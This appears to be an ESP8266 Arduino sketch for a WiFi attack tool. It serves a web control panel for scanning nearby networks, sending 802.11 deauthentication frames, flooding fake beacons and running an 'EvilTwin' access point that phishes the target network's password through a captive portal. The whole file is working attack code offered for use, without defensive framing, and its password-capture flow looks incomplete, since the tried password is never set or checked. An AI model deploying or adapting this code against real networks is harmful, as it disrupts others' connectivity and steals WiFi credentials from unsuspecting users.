#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>

extern "C" {
#include "user_interface.h"
}

const char* ap_ssid = "WiFi_Attack_Panel";
const char* ap_password = "";
AsyncWebServer server(80);
DNSServer dnsServer;
IPAddress apIP(192, 168, 4, 1);

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

_Network _networks[20];
_Network _selectedNetwork;
int totalNetworks = 0;
bool hotspot_active = false;
bool deauthing_active = false;
bool beaconActive = false;
String _correct = "";
String _tryPassword = "";
unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;
unsigned long beacon_now = 0;
uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
String selectedSSID = "";
uint8_t selectedBSSID[6];
int selectedChannel = 1;

void clearArray() {
  for (int i = 0; i < 20; i++) {
    _Network _network;
    _networks[i] = _network;
  }
  totalNetworks = 0;
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 20; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[totalNetworks++] = network;
    }
  }
}

String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='get' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='get' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'>{hotspot_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='get' action='/?beacon={beacon}'>"
                   "<button style='display:inline-block;'>{beacon_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex(AsyncWebServerRequest *request) {
  if (request->hasArg("ap")) {
    for (int i = 0; i < totalNetworks; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == request->arg("ap") ) {
        _selectedNetwork = _networks[i];
        selectedSSID = _networks[i].ssid;
        selectedChannel = _networks[i].ch;
        memcpy(selectedBSSID, _networks[i].bssid, 6);
      }
    }
  }

  if (request->hasArg("deauth")) {
    deauthing_active = (request->arg("deauth") == "start");
  }

  if (request->hasArg("hotspot")) {
    if (request->arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      WiFi.softAPdisconnect (true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", apIP);
    } else if (request->arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      WiFi.softAPdisconnect (true);
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP("DevilTwin", "12345678");
      dnsServer.start(53, "*", apIP);
    }
    request->send(200, "text/html", "<script>window.location.href = '/';</script>");
    return;
  }

  if (request->hasArg("beacon")) {
    beaconActive = (request->arg("beacon") == "start");
    request->send(200, "text/html", "<script>window.location.href = '/';</script>");
    return;
  }

  String _html = _tempHTML;
  for (int i = 0; i < totalNetworks; ++i) {
    if (_networks[i].ssid == "") break;
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='get' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
    if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  _html.replace("{deauth_button}", deauthing_active ? "Stop Deauthing" : "Start Deauthing");
  _html.replace("{hotspot_button}", hotspot_active ? "Stop EvilTwin" : "Start EvilTwin");
  _html.replace("{beacon_button}", beaconActive ? "Stop Beacon Flood" : "Start Beacon Flood");

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  request->send(200, "text/html", _html);
}

void handleResult(AsyncWebServerRequest *request) {
  if (WiFi.status() != WL_CONNECTED) {
    request->send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
    Serial.println("Wrong password tried !");
  } else {
    request->send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
    hotspot_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect (true);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP("DevilTwin", "12345678");
    dnsServer.start(53, "*", apIP);
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}

void sendDeauthPacket(uint8_t *bssid, uint8_t channel) {
  uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00,
    0x07, 0x00
  };
  wifi_set_channel(channel);
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
}

void sendFakeSSID(String name, uint8_t channel) {
  uint8_t beaconPacket[128] = {
    0x80, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
  };

  int len = name.length();
  beaconPacket[37] = 0x00;
  beaconPacket[38] = len;
  memcpy(&beaconPacket[39], name.c_str(), len);

  wifi_set_channel(channel);
  wifi_send_pkt_freedom(beaconPacket, 39 + len, 0);
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ap_ssid, ap_password);
  dnsServer.start(53, "*", apIP);
  wifi_promiscuous_enable(1);
  performScan();

  server.on("/", HTTP_GET, handleIndex);
  server.on("/result", HTTP_GET, handleResult);
  server.onNotFound([](AsyncWebServerRequest *request){
    request->send(404, "text/plain", "Not found");
  });
  server.begin();
}

void loop() {
  dnsServer.processNextRequest();

  if (deauthing_active) {
    if (millis() - deauth_now >= 1000) {
      wifi_set_channel(_selectedNetwork.ch);
      uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
      memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
      memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
      deauthPacket[24] = 1;
      wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
      deauthPacket[0] = 0xA0;
      wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
      deauth_now = millis();
    }
  } else {
    deauth_now = millis(); // Reset timer if deauthing is off
  }

  if (beaconActive) {
    if (millis() - beacon_now >= 5) {
      sendFakeSSID(selectedSSID + "_EvilTwin", selectedChannel);
      beacon_now = millis();
    }
  } else {
    beacon_now = millis(); // Reset timer if beacon is off
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    Serial.println(WiFi.status() == WL_CONNECTED ? "WiFi Connected" : "WiFi Disconnected");
    wifinow = millis();
  }
}